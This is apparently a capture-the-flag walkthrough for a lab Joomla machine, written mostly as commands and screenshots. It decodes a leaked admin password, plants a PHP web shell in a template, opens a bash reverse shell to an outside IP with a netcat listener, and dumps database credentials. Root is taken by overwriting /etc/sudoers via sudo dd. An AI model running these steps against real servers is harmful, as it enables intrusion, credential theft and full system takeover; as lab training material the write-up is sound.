![image](https://github.com/user-attachments/assets/9f1276a1-350a-4320-afbf-8d227ba35aa1)
```bash
ping -c 1 172.17.0.2
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
nmap -sCV -p80,3000,5000 172.17.0.2 -oN targeted
```
![Pasted image 20250130221948](https://github.com/user-attachments/assets/ea8384da-2b52-4f1a-a0cc-8113476035fb)
![Pasted image 20250130222205](https://github.com/user-attachments/assets/875e5c62-1ded-4593-9faf-ebfbe4aa86e8)

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh,html,js
```
![Pasted image 20250130224322](https://github.com/user-attachments/assets/8c9bb372-5efa-4e31-bd17-166fee52e4bb)
![Pasted image 20250130224341](https://github.com/user-attachments/assets/f2b97e8a-0de0-4f47-b7d2-048eddf32b41)
admin:c2FubHVpczEyMzQ1

![Pasted image 20250130235727](https://github.com/user-attachments/assets/2fa564c1-840c-4d97-b627-5bc186e4763f)
![Pasted image 20250130235734](https://github.com/user-attachments/assets/101b6bfc-427e-480a-87d5-20fdb132c56f)
![Pasted image 20250130235747](https://github.com/user-attachments/assets/5feed2e4-6e3a-42cc-9875-dce72efc7131)
admin:c2FubHVpczEyMzQ1

## **we have a user and a confirmed password only it is encrypted so we will decode it.**

```bash
echo "c2FubHVpczEyMzQ1" |base64 -d
```
![Pasted image 20250131000043](https://github.com/user-attachments/assets/3f9293e6-2024-4d86-ab2b-d9a4c6002a70)
sanluis12345

## **we enter http://172.17.0.2/administrator/**

![Pasted image 20250131104737](https://github.com/user-attachments/assets/5d5d6a88-5e1e-4d4a-a64f-aa099460eb59)
![Pasted image 20250131104754](https://github.com/user-attachments/assets/8525480d-0f26-4d87-89f0-0552fbb7d6b1)

## **we already have access to the administrator jomla profile**

## **now that we have access we need to upload a malicious code to get remote access so let's modify the template**

![Pasted image 20250131105123](https://github.com/user-attachments/assets/bd1cb5e1-9422-4185-8cf6-ae52e9d41522)
![Pasted image 20250131105215](https://github.com/user-attachments/assets/2ff60354-e341-4ded-a666-dd0327a29ab1)
![Pasted image 20250131105235](https://github.com/user-attachments/assets/f5476ea2-bc4a-4047-acbd-f4344e26ce61)
![Pasted image 20250131105257](https://github.com/user-attachments/assets/bd94e176-735b-4cca-aaed-1913a567853f)

## **we will add a message to see if it is shown on the web so that when we enter a directory that does not exist it will show us what we entered.**

![Pasted image 20250131105639](https://github.com/user-attachments/assets/ccb84b34-632e-4774-9546-a2d60a6cc7df)

## **we will add this code on the web**
```bash
system($_GET["cmd"]);
```
![Pasted image 20250131111035](https://github.com/user-attachments/assets/2d9ba69f-9a03-4316-9906-821b251d583a)

## **we add this to our search engine**
```bash
?cmd=comando
```
![Pasted image 20250131111608](https://github.com/user-attachments/assets/03ab62cf-d52c-4ca4-8b79-0c46b2f3aad5)

## **we will now send a revershell**

```bash
bash -c "bash -i >%26 /dev/tcp/192.168.1.228/444 0>%261
```
![Pasted image 20250131111901](https://github.com/user-attachments/assets/ed6d875f-4fd8-47a7-8b3a-f79af471317e)

## **we listen to** 
```bash
nc -nlvp 444
```
![Pasted image 20250131112204](https://github.com/user-attachments/assets/2911daa4-d2c8-4f02-a72a-2ec0c9535464)

## **we already have access we will make a treatment of the tty**
```bash
script /dev/null -c bash
"CTRL+Z"
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

## **by investigating we found the configuration.php file**
```bash
nano configuration.php
```
![Pasted image 20250131112658](https://github.com/user-attachments/assets/d5d2d150-f01c-4dd7-bdd0-650494820867)

user:       joomla_user
passwd:  luisillo123456

## **we will log in with the credentials found**
```bash
mysql -h localhost -u joomla_user -p
```
![Pasted image 20250131113536](https://github.com/user-attachments/assets/376824e0-d88b-4b47-b77b-08d41df30b71)

```MYSQL
show databases;
use DATABASENAME;
show tables;
select * from users;*
```
![Pasted image 20250131114142](https://github.com/user-attachments/assets/c9634dfa-5690-49d7-a9c8-8e6f33b8bc37)
![Pasted image 20250131114205](https://github.com/user-attachments/assets/716bd12a-9686-40ed-a56e-d0fda7b58974)
![Pasted image 20250131114234](https://github.com/user-attachments/assets/50679c3b-f171-4164-8bb2-8453664e9d05)

## **we don't have more information than the user admin**

## **we continue to investigate inside the home folder there are two users but we do not have access**

![Pasted image 20250131114551](https://github.com/user-attachments/assets/e32b47f5-f2db-4ce2-a07d-e936d4da2200)

## **we are looking for possible files for the user luisillo**
```bash
find / -user luisillo 2>/dev/null
```
![Pasted image 20250131114956](https://github.com/user-attachments/assets/4511c51b-3b53-4cdc-a189-c8ce83c79816)

user:         luisillo
passwd:    luisillosuperpassword

```bash
su luisillo
```
![Pasted image 20250131115121](https://github.com/user-attachments/assets/43a3547b-4d99-40fa-8105-08315f4f01c2)

```bash
sudo -l
```
![Pasted image 20250131115147](https://github.com/user-attachments/assets/86ee1c6f-094a-4717-8f59-1535f86d35f7)
![Pasted image 20250131115327](https://github.com/user-attachments/assets/d8653740-eae7-41bc-aa20-d964b86e0e21)

```bash
echo "luisillo ALL=(ALL:ALL) ALL" | sudo /bin/dd of=/etc/sudoers
```
![Pasted image 20250131115656](https://github.com/user-attachments/assets/dd6bcc69-a94a-4ea7-b57a-7138764a805e)
